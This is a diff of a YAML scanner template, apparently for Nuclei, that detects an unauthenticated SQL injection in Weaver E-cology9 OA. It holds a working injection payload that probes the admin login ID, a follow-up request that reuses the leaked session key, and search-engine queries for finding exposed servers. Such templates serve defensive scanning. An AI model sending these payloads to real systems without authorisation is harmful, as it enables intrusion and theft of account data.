@@ -1,5 +1,4 @@
 id: weaver-ecology9-doc-list-sqli
-
 info:
   name: Weaver E-cology9 api/doc/out/more/list SQL Injection
   author: DhiyaneshDk
@@ -11,46 +10,42 @@ info:
   reference:
     - https://1diot9.github.io/2026/05/13/%E6%B3%9B%E5%BE%AEe9%E5%88%86%E6%9E%90%E6%80%9D%E8%B7%AF/#%E6%B5%8B%E7%BB%98%E6%8C%87%E7%BA%B9
   metadata:
-    vendor: weaver
-    product: ecology9
     fofa-query: app="泛微-协同商务系统"
     hunter-query: app.name=="泛微 e-cology 9.0 OA"
-  tags: weaver,ecology,ecology9,sqli,unauth
-
+    product: ecology9
+    vendor: weaver
+  tags: ecology,ecology9,sqli,unauth,weaver
 http:
-  - raw:
-      - |
-        GET /api/doc/out/more/list?isNew=1&elementmore=%7B%22srcType%22%3A%20%222%22%2C%20%22srcContent%22%3A%20%22%2A%2F%3D%28%28-1%22%2C%20%22perpage%22%3A%20%2210%22%7D&docarchivedatefrom=a%27OR-1%2F%2Aa&doccreatedatefrom=%2A%2F%3D%28%2F%2Aa&doclastmoddatefrom=%2A%2FSELECT-3%2Blocate%2F%2A&docarchivedateto=%2A%2F%28hex%28SUBSTRING%28%2F%2A&doccreatedateto=%2A%2Floginid%2C1%2C1%29%29%2C%27073%27%29%20%2F%2A&doclastmoddateto=%2A%2Ffrom%20HrmResourceManager%20limit%200%2C1%29%20OR-1%2F%2A HTTP/1.1
-        Host: {{Hostname}}
-
+  - extractors:
+      - group: 1
+        internal: true
+        name: sessionkey
+        regex:
+          - '"sessionkey":"([^"]+)"'
+        type: regex
     matchers:
-      - type: dsl
+      - condition: and
         dsl:
           - status_code == 200
           - contains(body, '"useType":"sql"')
-        condition: and
         internal: true
+        type: dsl
+    raw:
+      - |
+        GET /api/doc/out/more/list?isNew=1&elementmore=%7B%22srcType%22%3A%20%222%22%2C%20%22srcContent%22%3A%20%22%2A%2F%3D%28%28-1%22%2C%20%22perpage%22%3A%20%2210%22%7D&docarchivedatefrom=a%27OR-1%2F%2Aa&doccreatedatefrom=%2A%2F%3D%28%2F%2Aa&doclastmoddatefrom=%2A%2FSELECT-3%2Blocate%2F%2A&docarchivedateto=%2A%2F%28hex%28SUBSTRING%28%2F%2A&doccreatedateto=%2A%2Floginid%2C1%2C1%29%29%2C%27073%27%29%20%2F%2A&doclastmoddateto=%2A%2Ffrom%20HrmResourceManager%20limit%200%2C1%29%20OR-1%2F%2A HTTP/1.1
+        Host: {{Hostname}}
+  - matchers:
+      - condition: and
+        # digest: 4a0a00473045022100fb41109e1ef90d5da3f26c2bdbe71c07d777136533e426f39721764bb8c1378e02207a1c6cf1e7931d5fa907def64b836a00e97d8d9adb14a697eea28eb000ef85e3:922c64590222798bb761d5b6d8e72950
 
-    extractors:
-      - type: regex
-        name: sessionkey
-        internal: true
-        group: 1
-        regex:
-          - '"sessionkey":"([^"]+)"'
-
-  - raw:
+        dsl:
+          - status_code == 200
+          - contains_all(body, '"status":true','"count":')
+        type: dsl
+    raw:
       - |
         POST /api/ec/dev/table/counts HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
 
         dataKey={{sessionkey}}
-
-    matchers:
-      - type: dsl
-        dsl:
-          - status_code == 200
-          - contains_all(body, '"status":true','"count":')
-        condition: and
-# digest: 4a0a00473045022100fb41109e1ef90d5da3f26c2bdbe71c07d777136533e426f39721764bb8c1378e02207a1c6cf1e7931d5fa907def64b836a00e97d8d9adb14a697eea28eb000ef85e3:922c64590222798bb761d5b6d8e72950
